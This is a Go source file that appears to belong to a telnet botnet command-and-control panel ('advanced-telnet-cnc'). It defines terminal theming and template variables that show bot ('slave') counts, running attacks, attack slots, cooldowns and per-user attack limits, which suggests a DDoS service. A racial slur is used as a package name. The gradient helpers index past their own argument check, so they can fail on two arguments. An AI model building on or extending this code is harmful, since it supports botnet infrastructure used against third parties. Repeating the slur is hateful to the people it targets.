package termfx

import (
	"advanced-telnet-cnc/packages/lufx"
	"advanced-telnet-cnc/source/config"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx/packages"
	"advanced-telnet-cnc/source/niggers"
	"errors"
	"github.com/iskaa02/qalam/gradient"

	"io"
)

var (
	Directory = "assets/branding/"
)

type TermFX struct {
	session *sessions.Session
}

func New(session *sessions.Session) *TermFX {
	return &TermFX{session: session}
}

func (termFx *TermFX) Colors(extras map[string]any) map[string]any {
	var mainMap = map[string]any{
		"colors": &packages.Colors{
			Red:         config.Red,
			DarkRed:     config.DarkRed,
			Blue:        config.Blue,
			DarkBlue:    config.DarkBlue,
			Green:       config.Green,
			DarkGreen:   config.DarkGreen,
			Yellow:      config.Yellow,
			DarkYellow:  config.DarkYellow,
			Magenta:     config.Magenta,
			DarkMagenta: config.DarkMagenta,
			Cyan:        config.Cyan,
			DarkCyan:    config.DarkCyan,
			Gray:        config.Gray,
			DarkGray:    config.DarkGray,
			PuttyWhite:  config.PuttyWhite,
			White:       config.White,
			Reset:       config.Reset,
			Colorize:    packages.Colorize,
		},
		"Gradient": lufx.FxFunction(func(session io.Writer, args []string) (int, error) {
			if len(args) < 2 {
				return 0, errors.New("not enough arguments")
			}

			g, _ := gradient.NewGradient(args[1], args[2])
			_, err := io.WriteString(session, g.Apply(args[0]))
			if err != nil {
				return 0, err
			}

			return len(args), nil
		}),
		"Hex2Color": lufx.FxFunction(func(session io.Writer, args []string) (int, error) {
			if len(args) < 2 {
				return 0, errors.New("not enough arguments")
			}

			_, err := io.WriteString(session, config.Colorize(config.Hex(args[0]))+args[1])
			if err != nil {
				return 0, err
			}

			return len(args), nil
		}),
	}

	if extras != nil {
		for key, value := range extras {
			mainMap[key] = value
		}
	}

	return mainMap
}

func (termFx *TermFX) Elements(extras map[string]any) map[string]any {
	var mainMap = map[string]any{
		"Begin": "<",
		"End":   ">",
		"user":  termFx.session.UserProfile,
		"slave": &packages.Slaves{
			Count:     niggers.Count(),
			UserCount: termFx.session.UserProfile.SlaveCount(),
		},
		"attacks": &packages.Attacks{
			Enabled:     packages.AttacksEnabled(),
			Running:     packages.AttacksRunning(),
			Slots:       packages.AttacksSlots(),
			Cooldown:    packages.AttacksCooldown(),
			AttacksLeft: packages.AttacksLeft(termFx.session.UserProfile),
		},
		"sessions": &packages.Sessions{
			Count: sessions.Count(),
		},
		"colors": &packages.Colors{
			Red:         config.Red,
			DarkRed:     config.DarkRed,
			Blue:        config.Blue,
			DarkBlue:    config.DarkBlue,
			Green:       config.Green,
			DarkGreen:   config.DarkGreen,
			Yellow:      config.Yellow,
			DarkYellow:  config.DarkYellow,
			Magenta:     config.Magenta,
			DarkMagenta: config.DarkMagenta,
			Cyan:        config.Cyan,
			DarkCyan:    config.DarkCyan,
			Gray:        config.Gray,
			DarkGray:    config.DarkGray,
			PuttyWhite:  config.PuttyWhite,
			White:       config.White,
			Reset:       config.Reset,
			Colorize:    packages.Colorize,
		},
		"theme": &packages.Theme{
			Primary:   packages.Colorize(termFx.session.Theme.Primary),
			Secondary: packages.Colorize(termFx.session.Theme.Secondary),
		},
		"Primary":   packages.Colorize(termFx.session.Theme.Primary),
		"Secondary": packages.Colorize(termFx.session.Theme.Secondary),
		"Gradient": lufx.FxFunction(func(session io.Writer, args []string) (int, error) {
			if len(args) < 2 {
				return 0, errors.New("not enough arguments")
			}

			g, _ := gradient.NewGradient(args[1], args[2])
			_, err := io.WriteString(session, g.Apply(args[0]))
			if err != nil {
				return 0, err
			}

			return len(args), nil
		}),
		"Hex2Color": lufx.FxFunction(func(session io.Writer, args []string) (int, error) {
			if len(args) < 2 {
				return 0, errors.New("not enough arguments")
			}

			_, err := io.WriteString(session, config.Colorize(config.Hex(args[0]))+args[1])
			if err != nil {
				return 0, err
			}

			return len(args), nil
		}),
	}

	if extras != nil {
		for key, value := range extras {
			mainMap[key] = value
		}
	}

	return mainMap
}
